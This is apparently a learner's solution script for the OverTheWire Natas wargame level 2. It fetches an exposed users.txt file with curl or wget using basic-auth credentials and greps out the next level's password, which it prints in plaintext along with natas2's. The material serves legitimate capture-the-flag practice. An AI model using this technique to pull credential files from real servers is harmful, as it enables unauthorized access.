# Natas Level 1 → Level 2
# Username: natas2
# URL:      http://natas2.natas.labs.overthewire.org



# after doing finding out hhere and there came with this url which list some fiels user.txt which has natas3 password
# url of files : http://natas2.natas.labs.overthewire.org/files/


# url="http://natas2.natas.labs.overthewire.org/files/"
# wget -r -np -nd --user=natas2 --password=TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/



# Approach 1
# single command approach to get password using curl
# ##################

# curl -s -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/users.txt | grep -i natas3




# Approach 2 :
################## basic python script using curl command and subprocesss this approach don't search #####

import subprocess
import sys

def main():
    # command of curl
    command ="curl -s -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/users.txt | grep -i natas3"
    
    try :
        # spawn shell config need to keep shell true for grep and curl
        result=subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            check=True
        )

        # The result muist have error or output distniguish basded on your needs
        if result.stdout:
            # remove shell based whitespaces if any
            print(result.stdout.strip())
        else :
            print("No results found")
    
    # error handling not needed but still
    except subprocess.CalledProcessError as e:
        print(f"Command faiiled with exit code {e.returncode}")
        if e.stderr:
            print(f"Error : {e.stderr}")
        sys.exit(1) # need to exit the spawneed shell or it takes memeory
    except FileNotFoundError :
       print("Error: curl command not found. Make sure curl is installed.")
       sys.exit(1) 

if __name__=="__main__":
    main()    


# password for natas 3 is : natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

# Approach 3 :
